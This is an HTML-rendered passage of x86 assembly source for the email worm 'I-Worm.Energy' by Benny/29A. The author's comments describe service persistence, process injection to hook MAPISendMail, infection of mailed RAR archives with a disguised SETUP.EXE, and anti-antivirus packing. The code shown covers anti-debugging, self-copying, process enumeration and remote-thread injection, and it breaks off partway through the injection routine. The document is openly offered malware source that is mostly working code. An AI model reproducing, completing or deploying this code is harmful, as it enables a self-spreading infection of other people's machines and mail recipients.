<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Energy.a - energy.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; COMMENT #</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                                ³  I-Worm.Energy   ³</span><span class="sc0">
</span><span class="sc1">;                                ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;                       ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                       ³    by Benny/29A    ³</span><span class="sc0">
</span><span class="sc1">;                       ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; hey all...</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; it was one b0ring sunday, when I decided to code some small and kewl virus...</span><span class="sc0">
</span><span class="sc1">; I was tired from coding large projectz (HIV, XTC)... I wanted to code one</span><span class="sc0">
</span><span class="sc1">; worm with some nice ideaz, like the Win2k.Stream.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; and here it is. after some meditationz, full of experiencez from psychedelics</span><span class="sc0">
</span><span class="sc1">; I decided to call this worm "Energy"... it is very small worm, spreading via</span><span class="sc0">
</span><span class="sc1">; RAR filez. it can parse all processes, hook there MAPISendMail API procedure</span><span class="sc0">
</span><span class="sc1">; and infect all attached RAR filez in a message by dropping itself to there.</span><span class="sc0">
</span><span class="sc1">; very similar technique of the process'es address space manipulationz is</span><span class="sc0">
</span><span class="sc1">; described in my article "Multi-process residency" and Win32.HIV virus. surely</span><span class="sc0">
</span><span class="sc1">; it can't work on Win95/98 systemz. it worx on Windows 2000 OS, and (perhaps)</span><span class="sc0">
</span><span class="sc1">; also on earlier versionz of Windows NT - but I don't know, I haven't tested it.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; it can stay resident in memory as a service, by standard API callz, valid only</span><span class="sc0">
</span><span class="sc1">; in NT systemz. while infecting the RAR archivez it addz itself to there under</span><span class="sc0">
</span><span class="sc1">; the "SETUP.EXE" filename, containing also the standard setup icon. I tried to</span><span class="sc0">
</span><span class="sc1">; optimize the source a bit... I know the worm is not super-small, but I it is</span><span class="sc0">
</span><span class="sc1">; resident heavilly armoured very effective tiny mail-spreading worm.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; the scheme of execution:</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; after execution:</span><span class="sc0">
</span><span class="sc1">; - anti-* stuff</span><span class="sc0">
</span><span class="sc1">; - if initialized by SCM, run as a service process</span><span class="sc0">
</span><span class="sc1">; - copy worm to system directory as "ENERGY.EXE"</span><span class="sc0">
</span><span class="sc1">; - register worm as service process and run it everytime the OS will start</span><span class="sc0">
</span><span class="sc1">; - enum processes, find MAPI32.dll there and hook MAPSendMail (using many</span><span class="sc0">
</span><span class="sc1">;   trics)</span><span class="sc0">
</span><span class="sc1">; - wait one minute and again</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; hook_procedure:</span><span class="sc0">
</span><span class="sc1">; - parse embedded filez and search for RAR filez.</span><span class="sc0">
</span><span class="sc1">; - infect them by worm file: SETUP.EXE, mark as read-only (already-infected</span><span class="sc0">
</span><span class="sc1">;   mark).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; the worm is encrypted/compressed by "tElock, version 0.51", one very nice</span><span class="sc0">
</span><span class="sc1">; utility for armouring executable filez. this protector containz many nice</span><span class="sc0">
</span><span class="sc1">; anti-* featurez. that's why I decided to use it. and also becoz I think guyz at</span><span class="sc0">
</span><span class="sc1">; AVP can't handle this one.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; it is possible that worm containz some bugz. yeah, but I don't care... I'm glad</span><span class="sc0">
</span><span class="sc1">; I was able to finish it in 2 dayz and that it was not b0ring. I had a fun.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; If you would like to consult anything with me, feel free to contact me...</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; (c) 14th November 2000                            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; Czech Republic                                    ³ Benny / 29A ÀÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                                                   @ benny_29a@privacyx.com  ³</span><span class="sc0">
</span><span class="sc1">;                                                   @ http://benny29a.cjb.net ³</span><span class="sc0">
</span><span class="sc1">;                                                   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; #</span><span class="sc0">


</span><span class="sc2">.586p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">                        </span><span class="sc1">;blablabla</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetLastError</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">               </span><span class="sc1">;needed APIz</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">EnumProcesses</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">OpenProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">VirtualProtect</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">VirtualAllocEx</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">VirtualFreeEx</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CreateRemoteThread</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">WriteProcessMemory</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">Sleep</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">WaitForSingleObject</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetModuleFileNameA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">VirtualFree</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">VirtualAlloc</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">SetFilePointer</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">SetFileAttributesA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">OpenMutexA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitThread</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetSystemDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">


</span><span class="sc1">;extrn  OpenServiceA:PROC</span><span class="sc0">
</span><span class="sc1">;extrn  DeleteService:PROC              ;***debug only!</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">OpenSCManagerA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CreateServiceA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CloseServiceHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">StartServiceCtrlDispatcherA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">RegisterServiceCtrlHandlerA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">SetServiceStatus</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">                  </span><span class="sc1">;include filez</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">


</span><span class="sc5">PROC_COUNT</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">;number of processes</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">;some data</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;worm code starts here</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">end_seh</span><span class="sc4">&gt;</span><span class="sc0">                </span><span class="sc1">;setup SEH frame</span><span class="sc0">

</span><span class="sc5">e_name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'EnErGy'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenMutexA</span><span class="sc0">              </span><span class="sc1">;check if mutex is</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;created, if not,</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_seh</span><span class="sc0">                 </span><span class="sc1">;we are prob. debugged</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc1">;close its handle</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SVCRegister</span><span class="sc0">             </span><span class="sc1">;logging as a service</span><span class="sc0">

</span><span class="sc5">e_svc</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">worm_name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">          </span><span class="sc1">;get path+filename of</span><span class="sc0">
                            </span><span class="sc1">;the worm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sys_dir</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">         </span><span class="sc1">;get windowz system dir.</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'rene'</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'e.yg'</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'ex'</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;construct path+filename</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyFileA</span><span class="sc0">               </span><span class="sc1">;copy worm to sys. dir.</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SVCCreate</span><span class="sc0">               </span><span class="sc1">;register as a service</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">api_num</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@api_table</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">         </span><span class="sc1">;adressez of APIz</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirtualProtect</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirtualFree</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirtualAlloc</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">
</span><span class="sc5">api_num</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">@api_table</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@api_dest</span><span class="sc0">               </span><span class="sc1">;addressez of variablez</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_gmha</span><span class="sc0">                </span><span class="sc1">;that will hold APIz</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_gpa</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_vp</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_cfa</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_ch</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_wf</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_gfs</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_rf</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_vf</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_va</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_sfp</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_sfaa</span><span class="sc0">
</span><span class="sc5">@api_dest</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">get_apiz</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;decrement counter</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;store API address</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">get_apiz</span><span class="sc0">

</span><span class="sc5">worm_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PROC_COUNT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">proc_dump</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumProcesses</span><span class="sc0">               </span><span class="sc1">;enum all processez</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_seh</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;try this PID</span><span class="sc0">
</span><span class="sc5">p_check</span><span class="sc4">:</span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">proc_infect</span><span class="sc0">             </span><span class="sc1">;try to infect it</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">p_check</span><span class="sc0">                 </span><span class="sc1">;try next PID</span><span class="sc0">

</span><span class="sc5">worm_wait</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">60000</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Sleep</span><span class="sc0">                   </span><span class="sc1">;wait one minute</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">worm_loop</span><span class="sc0">               </span><span class="sc1">;and try again.</span><span class="sc0">


</span><span class="sc1">;infect processez</span><span class="sc0">
</span><span class="sc5">proc_infect</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenProcess</span><span class="sc0">             </span><span class="sc1">;get handle to process</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_proc_infect</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virtual_end</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VirtualAllocEx</span><span class="sc0">              </span><span class="sc1">;allocate there memory</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;for worm</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_proc_infect2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virtual_end</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteProcessMemory</span><span class="sc0">          </span><span class="sc1">;copy there worm body</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_proc_infect3</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ThreadEntry</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
